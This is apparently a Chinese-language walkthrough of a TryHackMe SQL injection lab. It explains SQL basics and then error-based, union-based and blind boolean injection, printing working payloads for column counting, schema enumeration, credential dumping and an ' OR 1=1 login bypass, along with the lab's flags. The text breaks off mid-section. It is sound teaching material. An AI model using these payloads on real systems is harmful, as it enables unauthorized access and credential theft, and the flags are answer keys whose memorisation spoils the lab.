+<blockquote>
+<p>select * from users where username like ‘%mi%’;</p>
+<p>这将返回用户名中包含字符 mi 的任何行。</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221127234215742.png"
+                      alt="image-20221127234215742"
+                ></p>
+<p><strong>UNION</strong></p>
+<p>UNION 语句将组合两个或多个 SELECT 语句的结果以从单个或多个表中检索数据； 在进行<em><strong>多表查询</strong></em>时，此查询的规则是 UNION 语句必须在每个 SELECT 语句中<em><strong>检索相同数量的列</strong></em>，这些<em><strong>列必须具有相似的数据类型并且列顺序必须相同</strong></em>。 这听起来可能不是很清楚，所以让我们使用以下例子类比：假设一家公司想要为所有客户和供应商创建一个地址列表以邮寄新商品目录，我们有一个名为 customers 的表，其中包含以下内容：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128164235825.png"
+                      alt="image-20221128164235825"
+                ></p>
+<p>还有另一个表为供应商表(suppliers )，内容如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128164359786.png"
+                      alt="image-20221128164359786"
+                ></p>
+<p>使用下面的 SQL 语句，我们可以从上面的两个表中收集查询结果并将它们放入一个结果集合中（最终合并的列名，由第一条SELECT语句的查询结果决定）：</p>
+<blockquote>
+<p>SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128165005052.png"
+                      alt="image-20221128165005052"
+                ></p>
+<p><strong>INSERT</strong></p>
+<p>INSERT 语句将告诉数据库我们希望向表中插入一行新数据。 <code>into users</code>告诉数据库我们希望将数据插入哪个表，<code>(username,password)</code>将指明我们需要为其提供新数据的列&#x2F;字段属性，然后是<code>values (&#39;bob&#39;,&#39;password123&#39;);</code>将为先前指定的列提供一行新数据。</p>
+<blockquote>
+<p>insert into users (username,password) values (‘bob’,’password123’);</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128170348124.png"
+                      alt="image-20221128170348124"
+                ></p>
+<p><strong>UPDATE</strong></p>
+<p>UPDATE 语句将告诉数据库我们希望更新表中的一行或多行数据。你可以使用<code>update %tablename% SET</code>来指定要更新的表，然后选择你想要更新的一个或多个字段(此处需要指明列&#x2F;字段的具体值)并用逗号分隔清单，例如<code>username=&#39;root&#39;,password=&#39;pass123&#39;</code>，最后与 SELECT 语句类似，你还可以使用 where 子句来准确指定你要更新的行，例如<code>where username=&#39;admin&#39;;</code></p>
+<blockquote>
+<p>update users SET username&#x3D;’root’,password&#x3D;’pass123’ where username&#x3D;’admin’;</p>
+<p>更新之前为：2 admin p4ssword</p>
+<p>更新之后为：2 root     pass123</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128171317761.png"
+                      alt="image-20221128171317761"
+                ></p>
+<p><strong>DELETE</strong></p>
+<p>DELETE 语句将告诉数据库我们希望删除一行或多行数据。 除了缺少你希望返回的列之外，此查询的格式与 SELECT语句 非常相似，在此处可以使用 where 子句来精确指定你想要删除的数据，并可使用 LIMIT 子句来指定要删除的行数。</p>
+<blockquote>
+<p>delete from users where username&#x3D;’martin’;</p>
+<p>被删除的数据：3 martin secret123</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128171940837.png"
+                      alt="image-20221128171940837"
+                ></p>
+<blockquote>
+<p>delete from users;</p>
+<p>如果查询语句中没有使用 WHERE 子句，那么表中的所有数据都会被删除。</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128172202494.png"
+                      alt="image-20221128172202494"
+                ></p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128172309923.png"
+                      alt="image-20221128172309923"
+                ></p>
+<h2 id="什么是SQL注入漏洞？"><a href="#什么是SQL注入漏洞？" class="headerlink" title="什么是SQL注入漏洞？"></a>什么是SQL注入漏洞？</h2><p><strong>什么是SQL注入？</strong></p>
+<p>当用户提供的数据能够被包含在 SQL 查询语句中时，使用 SQL 的 Web 应用程序就会受到 SQL 注入攻击影响。</p>
+<p><strong>SQL注入是什么样子的？</strong></p>
+<p>假设你访问一个在线博客网站，该网站上的每个博客条目都有一个唯一的 ID 号相对应，博客条目可以设置为公开或私有，具体取决于它们是否准备好公开发布。</p>
+<p>每个博客条目的 URL 可能如下所示：</p>
+<blockquote>
+<p><a class="link"   target="_blank" rel="noopener" href="https://website.thm/blog?id=1" >https://website.thm/blog?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<p>从上面的 URL 中，你可以看到所选择的博客条目ID来自于查询字符串中的 id 参数，当该Web 应用程序需要从数据库中检索对应的博客文章时，则可能会使用如下所示的 SQL 语句：</p>
+<blockquote>
+<p>SELECT * from blog where id&#x3D;1 and private&#x3D;0 LIMIT 1;</p>
+</blockquote>
+<p>根据你在上一个小节中学到的知识，你应该能够得知上面的 SQL 语句的作用是 在 blog 表中查找 id 号为 1 且private列属性被设置为 0 (这意味着它能够供公众查看)的博客文章，最后的查询结果被限制为只有一个匹配项。</p>
+<p>正如本小节开始时所提到的，当用户的输入被引入到数据库查询语句中时，就会发生 SQL 注入。 在此实例中，你可以发现 URL 查询字符串中的 id 参数被直接用于 SQL 查询语句中。</p>
+<p>假设文章 id 2 被锁定为私有，因此我们无法在网站上直接查看该文章，我们现在可以尝试修改 URL ：</p>
+<blockquote>
+<p><a class="link"   target="_blank" rel="noopener" href="https://website.thm/blog?id=2;--" >https://website.thm/blog?id=2;-- <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<p>然后对应的 SQL 语句如下：</p>
+<blockquote>
+<p>SELECT * from blog where id&#x3D;2;– and private&#x3D;1 LIMIT 1;</p>
+</blockquote>
+<p>URL <strong><a class="link"   target="_blank" rel="noopener" href="https://website.thm/blog?id=2;--" >https://website.thm/blog?id=2;-- <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong>  中的分号表示 SQL 语句的结束，两个短横线符号则会导致其后面的所有内容都被视为注释（这里的分号和短横线都为英文字符）。</p>
+<p>通过这样处理，实际上在运行的SQL查询为：</p>
+<blockquote>
+<p>SELECT * from blog where id&#x3D;2;–</p>
+</blockquote>
+<p>以上查询语句将返回 id 为 2 的博客文章，无论它是否设置为公开权限。</p>
+<p>以上示例是一种被称为带内 SQL 注入的 SQL 注入漏洞类型；基础的SQL注入类型有 In-Band, Blind 和 Out Of Band ，我们将在接下来的知识点小节中进行讨论。</p>
+<p>tips：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">如何判断是否存在SQL注入：</span><br><span class="line">在URL或者一个提交表单中输入一个英文单引号或者其他特殊符号，如果页面出现错误说明此页面存在SQL注入，如果页面正常显示说明可能有字符被过滤了或者不存在注入。</span><br><span class="line"></span><br><span class="line">SQL注入的具体类别：</span><br><span class="line">事实上SQL注入有很多种，按数据类型可以分为数字型、字符型和搜索型，按提交方式可分为GET型，POST型，Cookie型和HTTP请求头注入，按执行效果有可以分为报错注入、联合查询注入、盲注和堆查询注入，其中盲注又可分为基于bool的盲注和基于时间的盲注。</span><br><span class="line"></span><br><span class="line">搜索型注入查询语句为：SELECT * FROM user WHERE search like &#x27;%1%&#x27;</span><br><span class="line">搜索型注入也可分为POST型和GET型,GET型一般是用于实现网站上的搜索功能,而POST型则是用在用户登录处,可以从form表单的method=&quot; &quot;属性来区分是GET型还是POST型。</span><br><span class="line">搜索型注入又被称为文本框注入。</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128175042652.png"
+                      alt="image-20221128175042652"
+                ></p>
+<p>tips：分号(英文符号)表示SQL语句段的结束。</p>
+<h2 id="带内SQLi（SQL-injection）"><a href="#带内SQLi（SQL-injection）" class="headerlink" title="带内SQLi（SQL injection）"></a>带内SQLi（SQL injection）</h2><p><strong>带内(In-Band) SQL 注入</strong></p>
+<p>带内 SQL 注入是最容易检测和利用的SQL注入类型；In-Band 是指使用相同的通信方法来利用漏洞以及接收攻击结果，例如，在网站某一页面上发现了 SQL 注入漏洞，然后能够从数据库中提取数据到发现注入点的同一页面。</p>
+<p><strong>基于报错(Error-Based)的 SQL 注入</strong></p>
+<p>这种类型的 SQL 注入对于轻松获取有关数据库结构的信息最有用，因为来自数据库的错误消息会直接打印到浏览器屏幕，这通常可用于枚举整个数据库。</p>
+<p><strong>基于联合(Union-Based)的 SQL 注入</strong></p>
+<p>这种类型的SQL注入会利用 UNION 运算符和 SELECT 语句将其他结果返回到发现注入点的页面，此方法是通过 SQL 注入漏洞获取大量数据的最常用方法。联合查询相当于把别的表的数据查询结果显示到当前表，使用联合查询时，必须使得两张表的表结构一致，因此我们需要判断当前表的列数有多少列。</p>
+<p>联合型注入发生的前提条件：要有显示位，在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端则会将数据展示在某个页面中，这个展示数据的位置就叫显示位。</p>
+<p>注：加号<code>+</code>在URL中有特殊含义，所以当我们在URL中使用的SQL注入payload包含了加号，那么就需要对其进行URL编码，经过URL编码的加号为<code>%2b</code>。</p>
+<p><strong>Practical:</strong></p>
+<p>在TryHackMe相关实验房间中，单击绿色的“启动机器”按钮以使用 SQL 注入示例练习实验室（<em><strong>这个SQL注入实验室在接下来的几个知识点小节中也会用到</strong></em>）；每个实验级别都包含一个模拟浏览器以及 SQL 查询框和报错框，以帮助你获得 查询&#x2F;有效载荷 的最终结果。</p>
+<p>注：在进行SQL注入时，可以直接在URL中提交注入语句，此时需要将SQL语句中的注释符<code>#</code>进行URL编码(或者使用<code>--</code>进行注释)，有时候整个SQL注入语句都需要经过URL编码处理。</p>
+<p>SQL注入实验的第一关包含一个模拟浏览器和一个网站，该网站是一个在线博客网站，你可以通过更改 URL 查询字符串中的 ID 号来访问不同的博客文章网页。</p>
+<p>发现基于报错的 SQL 注入的关键是通过尝试某些字符来破坏代码的 SQL 查询，直到产生错误消息； 最常见的是使用英文单引号 (<code>&#39;</code>) 或英文双引号 (<code>&quot;</code>)。</p>
+<p>我们可以尝试在URL中的 id&#x3D;1 后键入英文单引号 (<code>&#39;</code>)，然后按下 Enter 键，如果你看到当前页面返回一个 SQL查询 报错，以通知你所使用的SQL语法中存在错误，那么基于收到报错消息这一事实，你已经成功验证了当前网站页面存在SQL 注入漏洞；我们可以进一步利用此注入漏洞并通过报错消息来了解有关数据库结构的更多信息。</p>
+<p>我们接下来需要尝试将数据库中的数据返回给浏览器页面而不是简单地显示一些错误消息。 首先，我们将使用 UNION 运算符，以便我们可以接收到我们所查询到的一些额外结果，尝试将模拟浏览器URL中的 id 参数设置为：</p>
+<blockquote>
+<p>1 UNION SELECT 1</p>
+</blockquote>
+<p>以上语句会产生一条错误消息，通知我们 UNION SELECT 语句的列数与原始 SELECT 查询的列数不同；因此，我们可以添加列数并再试一次：</p>
+<blockquote>
+<p>1 UNION SELECT 1,2</p>
+</blockquote>
+<p>以上语句又产生了和之前同样的错误，所以我们再添加一列进行尝试：</p>
+<blockquote>
+<p>1 UNION SELECT 1,2,3</p>
+</blockquote>
+<p>以上语句执行成功，我们可以发现报错消息消失了，当前页面将显示id为 1 的文章，但是我们想显示数据库中的数据而不是显示文章内容。此处会显示文章内容是因为查询语句在网站代码的某处获取到了第一个返回结果并将该结果显示在当前网页页面；为了解决这个问题，我们需要让第一条查询语句不产生任何结果，这可以简单地通过将文章 ID 从 1 更改为 0 来完成。</p>
+<blockquote>
+<p>0 UNION SELECT 1,2,3</p>
+</blockquote>
+<p>你现在将看到浏览器当前页面内容仅由UNION select的结果组成即只返回列值(value) 1、2 和 3 ；我们可以使用这些返回值来检索更有用的信息，首先，我们将获取我们有权访问的数据库名称：</p>
+<blockquote>
+<p>0 UNION SELECT 1,2,database()</p>
+</blockquote>
+<p>使用以上语句，你将看到之前显示数字 3 的位置 现在将显示目标数据库的名称，即 <em><strong>sqli_one</strong></em> 。</p>
+<p>我们的下一个查询将收集该数据库中的所有表(table)信息。</p>
+<blockquote>
+<p>0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema &#x3D; ‘sqli_one’</p>
+</blockquote>
+<p>在此查询中有一些新东西需要学习：首先，<code>group_concat()</code> 方法能够从多个返回的行中获取指定的列（在我们的例子中为 <code>table_name</code> 列&#x2F;字段），并将其放入一个以逗号分隔的字符串中；接下来是 <code>information_schema</code> 信息数据库，目标数据库的每个用户都可以访问这个信息数据库，该信息数据库将包含有关用户有权访问的所有数据库和表的信息。 在这个特定的查询中，我们可以列出 <em><strong>sqli_one</strong></em> 数据库中的所有表，即 <em><strong>article</strong></em> 表和 <em><strong>staff_users</strong></em> 表 。</p>
+<p>由于此SQL注入实验第一关旨在发现 Martin 的密码，因此我们对 <em><strong>staff_users</strong></em> 表感兴趣，我们可以再次利用<code>information_schema</code>信息数据库，使用以下查询找到该表的结构：</p>
+<blockquote>
+<p>0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name &#x3D; ‘staff_users’</p>
+</blockquote>
+<p>上面这条查询类似于前面用于查找表名的 SQL 查询，但是，在此处我们要检索的信息已从之前的 <code>table_name</code>字段 更改为 <code>column_name</code>字段，并且我们在信息数据库<code>information_schema</code>中要查询的信息表从tables (表) 更改为columns (列) 。最后我们接着搜索 <code>table_name</code> 列的值为<code>staff_users</code>的所有行。(结合group_concat之后，此处从信息数据库中查询到的是关于数据库所有列名的信息，最后再结合where子句筛选出staff_users表中的所有列名)</p>
+<p>由查询结果可知 <em><strong>staff_users</strong></em> 表有三列：id、password 和 username。 我们可以使用包含username和password 列(字段)的查询语句来检索用户信息。</p>
+<p><code>0 UNION SELECT 1,2,group_concat(username,&#39;:&#39;,password SEPARATOR &#39;&lt;br&gt;&#39;) FROM staff_users</code></p>
+<p>我们再次使用 <code>group_concat</code> 方法将所有行信息都返回到一个字符串中，我们添加了 <code>,&#39;:&#39;,</code>来将用户名信息和密码信息彼此分开，我们在此处没有用逗号分隔，而是选择了 HTML中的 <code>&lt;br&gt;</code> 标记来作为分隔符号，它将强制每个查询结果都位于单独的一行上，以便于我们查看最终的SQL注入查询结果。</p>
+<p>我们现在可以访问到 Martin 的密码信息并能进入下一级别的SQL注入关卡（这将在下一小节中进行操作介绍）。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128205440630.png"
+                      alt="image-20221128205440630"
+                ></p>
+<p>启动实验环境：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128212444010.png"
+                      alt="image-20221128212444010"
+                ></p>
+<p>加英文单引号：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128212632382.png"
+                      alt="image-20221128212632382"
+                ></p>
+<p>上图报错信息所对应的中文翻译：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128212703433.png"
+                      alt="image-20221128212703433"
+                ></p>
+<p>猜解原始 SELECT 查询的列数：</p>
+<blockquote>
+<p>1 UNION SELECT 1</p>
+<p>1 UNION SELECT 1,2</p>
+<p>1 UNION SELECT 1,2,3</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128213019232.png"
+                      alt="image-20221128213019232"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128213219892.png"
+                      alt="image-20221128213219892"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128213504181.png"
+                      alt="image-20221128213504181"
+                ></p>
+<p>让原始select查询不产生任何结果，将id &#x3D; 1 改为id &#x3D; 0 即可：</p>
+<blockquote>
+<p>0 UNION SELECT 1,2,3</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128213839173.png"
+                      alt="image-20221128213839173"
+                ></p>
+<p>查询目标数据库的名称：</p>
+<blockquote>
+<p>0 UNION SELECT 1,2,database()</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128214036015.png"
+                      alt="image-20221128214036015"
+                ></p>
+<p>查询目标数据库包含的表名：</p>
+<blockquote>
+<p>0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema &#x3D; ‘sqli_one’</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128214152838.png"
+                      alt="image-20221128214152838"
+                ></p>
+<p>查询<em><strong>staff_users</strong></em> 表中的列名：</p>
+<blockquote>
+<p>0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name &#x3D; ‘staff_users’</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128214421024.png"
+                      alt="image-20221128214421024"
+                ></p>
+<p>检索 <em><strong>staff_users</strong></em> 表中的用户信息：</p>
+<p><code>0 UNION SELECT 1,2,group_concat(username,&#39;:&#39;,password SEPARATOR &#39;&lt;br&gt;&#39;) FROM staff_users</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128214818214.png"
+                      alt="image-20221128214818214"
+                ></p>
+<p>获取实验关卡一的flag：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128215008013.png"
+                      alt="image-20221128215008013"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128215115677.png"
+                      alt="image-20221128215115677"
+                ></p>
+<blockquote>
+<p>THM{SQL_INJECTION_3840}</p>
+</blockquote>
+<h2 id="SQL盲注—身份认证绕过"><a href="#SQL盲注—身份认证绕过" class="headerlink" title="SQL盲注—身份认证绕过"></a>SQL盲注—身份认证绕过</h2><p><strong>Blind SQLi (盲注类型的SQL注入)</strong></p>
+<p>与我们可以直接在屏幕上看到攻击结果的带内 SQL 注入不同，盲注类型的 SQLi 是指我们几乎没有或根本没有反馈信息来确认我们所注入的SQL查询是否成功，这是因为错误消息已被禁用，但实际上注入攻击可能仍然有效，只是无法直接在页面上看到SQL注入结果。在盲注类型的SQL注入攻击中，我们所需要的只是成功枚举整个数据库之后的一点点反馈信息。</p>
+<p><strong>Authentication Bypass (身份认证绕过)</strong></p>
+<p>最直接的 SQL 盲注技巧是绕过登录表单等身份验证方法进行SQL注入，在这种情况下，我们对从数据库中检索数据并不感兴趣，我们只是想通过SQL注入来实现登录成功的操作。  </p>
+<p>连接到用户数据库的登录表单通常以这样一种方式开发，即 Web 应用程序对用户名和密码的内容其实并不感兴趣，更多的是关注这两者所对应的数据是否 在数据库的用户表中能够得到匹配；简而言之，Web 应用程序将询问其对应的数据库“你是否有用户名为 bob 且密码为 bob123 的用户？”等类似问题，而数据库则负责回答yes或no（真true&#x2F;假false），该答案将决定 Web 应用程序是否允许你通过登录验证并实现登录成功操作。</p>
+<p>考虑到上述信息，我们在此处没有必要枚举有效的用户名以及密码值，我们只需要构建一个以 yes&#x2F;true 作为回复的数据库查询语句即可。</p>
+<p><strong>练习</strong></p>
+<p>进入SQL 注入实验的关卡二，我们可以在标有“SQL查询”的框中看到对数据库的原始查询如下：</p>
+<blockquote>
+<p>select * from users where username&#x3D;’%username%’ and password&#x3D;’%password%’ LIMIT 1;</p>
+</blockquote>
+<p>注意：%username% 和 %password% 值都将取自登录表单中的输入字段，在此处SQL 查询框中的初始值将为空，因为这些字段当前在登录表单中输入为空。</p>
+<p>为了使上述查询成为一个始终返回 true 的查询，我们可以在登录表单的密码字段中输入以下内容：</p>
+<blockquote>
+<p>‘ OR 1&#x3D;1;–</p>
+</blockquote>
+<p>然后在登录表单的用户名字段输入随机内容，以输入 1 为例。</p>
+<p>通过完成以上操作将使之前的 SQL 查询变成以下内容：</p>
+<blockquote>
+<p>select * from users where username&#x3D;’1’ and password&#x3D;’’ OR 1&#x3D;1;</p>
+</blockquote>
+<p>因为 1&#x3D;1 是一个 true 语句并且我们还使用了 OR 运算符，所以这条查询语句将始终导致SQL查询的返回结果始终为 true，这就满足 web 应用程序逻辑，即web应用程序会认为数据库已经找到了有效的用户名&#x2F;密码组合 然后将允许我们成功通过登录验证机制 。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129000353877.png"
+                      alt="image-20221129000353877"
+                ></p>
+<p>查看关卡二的原始查询界面：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129000304762.png"
+                      alt="image-20221129000304762"
+                ></p>
+<p>在用户名框输入1或者其他字符，在密码框中输入payload <code>&#39; OR 1=1;--</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128235828877.png"
+                      alt="image-20221128235828877"
+                ></p>
+<p>点击登录，出现以下界面：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129000018422.png"
+                      alt="image-20221129000018422"
+                ></p>
+<p>获取SQL实验关卡二的flag（转到第三关即可查看关卡二的flag）：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129000151958.png"
+                      alt="image-20221129000151958"
+                ></p>
+<blockquote>
+<p>THM{SQL_INJECTION_9581}</p>
+</blockquote>
+<h2 id="SQL盲注—基于布尔"><a href="#SQL盲注—基于布尔" class="headerlink" title="SQL盲注—基于布尔"></a>SQL盲注—基于布尔</h2><p><strong>基于布尔的SQL盲注</strong></p>
+<p>基于布尔的 SQL 注入是指：当我们经过注入尝试之后，所收到的响应可能为 true&#x2F;false、yes&#x2F;no、on&#x2F;off、1&#x2F;0 或其他任何只会有两个结果的响应消息。布尔值所对应的结果将向我们确认 SQL 注入payload是否执行成功，你可能会觉得这种有限的回答无法提供太多信息，但实际上，仅通过两种响应结果，我们就可以枚举整个数据库结构和内容。</p>
+<p><strong>练习</strong></p>
+<p>在 SQL 注入实验的第三关，你将看到一个具有以下 URL 的模拟浏览器：</p>
+<blockquote>
+<p><a class="link"   target="_blank" rel="noopener" href="https://website.thm/checkuser?username=admin" >https://website.thm/checkuser?username=admin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<p>浏览器主体还包含其他内容： <code>&#123;&quot;taken&quot;:true&#125;</code> 。 这个 API 端点对应的是许多注册表单上的一个常见功能，即检查用户名是否已注册 以提示用户是否应该重新选择不同的用户名；因为此处的取值为 true，所以我们可以假设用户名 admin 已经被注册。 事实上，我们也可以通过将模拟浏览器地址栏中的用户名从 admin 更改为 admin123 来确认这一点，修改用户名之后按下回车键，如果你看到taken值更改为 false，则代表用户名admin123未注册，相对应地我们就能知道之前显示的用户名admin已经被注册了。</p>
+<p>该关卡提供的原始 SQL 查询语句如下所示：</p>
+<blockquote>
+<p>select * from users where username &#x3D; ‘%username%’ LIMIT 1;</p>
+</blockquote>
+<p>我们可以控制查询字符串中的用户名，因为它是唯一的用户输入点，所以我们将不得不使用它来执行我们的 SQL 注入攻击。 将用户名设置为 admin123，此时所对应的taken值为false，我们可以尝试在admin123后面附加SQL注入payload，直到将 taken 字段的状态从 false 更改为 true。</p>
+<p>与之前的关卡一样，我们的首要任务是先确定用户表的列数，我们可以使用 UNION 语句来实现，尝试将用户名对应的值更改为以下内容：</p>
+<blockquote>
+<p>admin123’ UNION SELECT 1;– </p>
+</blockquote>
+<p>由于 Web 应用程序响应的taken值为 false，因此我们可以确认列数 1 不是正确的列值，我们可以继续添加更多列，直到我们得到的taken值为 true 。你可以通过将用户名设置为以下值来确认用户表实际的列数为 3 ：</p>
+<blockquote>
+<p>admin123’ UNION SELECT 1,2,3;– </p>
+</blockquote>
+<p>现在我们已经确定用户表的列数，我们可以进行关于目标数据库的枚举操作。我们的首要任务是发现数据库名称，为此，我们可以使用<code>database()</code>方法，然后使用 <code>like</code>运算符尝试查找将返回taken值为true状态的结果。</p>
+<p>尝试使用下面的用户名值，看看会发生什么：</p>
+<blockquote>
+<p>admin123’ UNION SELECT 1,2,3 where database() like ‘%’;–</p>
+</blockquote>
+<p>我们得到一个true的响应，因为在<code>like</code>运算符中，我们只提供了<code>%</code>的值，<code>%</code>是通配符值，它将匹配任何东西。 如果我们将通配符更改为<code>a%</code>，你将看到响应的返回值为false，这说明目标数据库名称不是以字母 a 开头；我们可以循环遍历所有字母、数字和字符，例如字符<code>-</code> 和 <code>_</code>，直到找到匹配项为止。 </p>
+<p>如果你将以下payload内容作为用户名值发送，你将收到一个返回值为true的响应，这说明数据库名称是以字母<code>s</code>开头的。</p>
+<blockquote>
+<p>admin123’ UNION SELECT 1,2,3 where database() like ‘s%’;–</p>
+</blockquote>
+<p>现在你需要移动到数据库名称的下一个字符继续使用通配符，直到找到另一个返回值为true的响应，例如“<code>sa%</code>”、“<code>sb%</code>”、“<code>sc%</code>”等；重复以上过程，直到你发现数据库名称的所有字符为止，最终我们成功得到了目标数据库的名称，即 <em><strong>sqli_three</strong></em> 。</p>
+<p>我们已经知道了数据库名称，我们可以继续使用<code>information_schema</code>信息数据库通过类似的方法来枚举表的名称，尝试将用户名设置为以下值：</p>
+<blockquote>
+<p>admin123’ UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema &#x3D; ‘sqli_three’ and table_name like ‘a%’;–</p>
+</blockquote>
+<p>以上查询语句将在 <em><strong>information_schema</strong></em> 信息数据库中查找 数据库名称为 <em><strong>sqli_three</strong></em> 且表名称以字母a开头的tables表的结果。由于上述查询结果为false响应，我们可以确认 <em><strong>sqli_three</strong></em> 数据库中没有以字母<strong>a</strong>开头的表；像之前一样，你需要循环遍历字母、数字和字符，直到找到完整的匹配项。</p>
+<p>最终我们在 <em><strong>sqli_three</strong></em> 数据库中发现一个名为 <em><strong>users</strong></em> 的表，你可以通过运行以下payload来确认：</p>
+<blockquote>
+<p>admin123’ UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema &#x3D; ‘sqli_three’ and table_name&#x3D;’users’;–</p>
+</blockquote>
+<p>最后，我们需要枚举 <em><strong>users</strong></em> 表中的 列(字段) 名，以便我们可以正确地在其中搜索用户的登录凭据。我们再次使用 <em><strong>information_schema</strong></em> 信息数据库并结合我们已经获得的信息，开始查询 <em><strong>users</strong></em> 表的列名。 使用下面的payload，我们可以搜索数据库名称为<em><strong>sqli_three</strong></em>，表名为<em><strong>users</strong></em>，并且列名以字母a开头的列信息表。</p>
+<blockquote>
+<p>admin123’ UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA&#x3D;’sqli_three’ and TABLE_NAME&#x3D;’users’ and COLUMN_NAME like ‘a%’;–</p>
+</blockquote>
+<p>同样，你需要循环遍历字母、数字和字符，直到找到匹配项。 当你正在匹配多个查询结果时，你必须在每次找到新的列名时将其添加到你的payload中，这样你就不会一直发现相同的结果；例如，当你找到名为 id 的列后，你需要将其附加到原始的payload中（如下所示），以便继续查找下一个列名。</p>
+<blockquote>
+<p>admin123’ UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA&#x3D;’sqli_three’ and TABLE_NAME&#x3D;’users’ and COLUMN_NAME like ‘a%’ and COLUMN_NAME !&#x3D;’id’;–</p>
+</blockquote>
+<p>重复上述过程，你最终能够发现 <em><strong>users</strong></em> 表中的所有列名为 <code>id</code>、<code>username</code> 和 <code>password</code>。 现在我们可以使用列名来查询 <em><strong>users</strong></em> 表的内容以获取有效登录凭据；首先，你需要发现一个有效的用户名，你可以尝试使用下面的payload：</p>
+<blockquote>
+<p>admin123’ UNION SELECT 1,2,3 from users where username like ‘a%’;–</p>
+</blockquote>
+<p>继续循环遍历所有字符，你将确认用户名 <em><strong>admin</strong></em> 的存在。知道了有效的用户名之后，我们需要继续发现该用户名所对应的密码值，下面的payload向你展示了如何找到用户名 <em><strong>admin</strong></em> 所对应的密码值：</p>
+<blockquote>
+<p>admin123’ UNION SELECT 1,2,3 from users where username&#x3D;’admin’ and password like ‘a%’;–</p>
+</blockquote>
+<p>使用上面的payload，循环遍历所有字符，你会发现该密码值为<em><strong>3845</strong></em>。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129000725560.png"
+                      alt="image-20221129000725560"
+                ></p>
+<p>查看关卡三的原始查询界面：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129191313262.png"
+                      alt="image-20221129191313262"
+                ></p>
+<p>确认原始查询所用的表中的列数：</p>
+<blockquote>
+<p>admin123’ UNION SELECT 1,2,3;– </p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
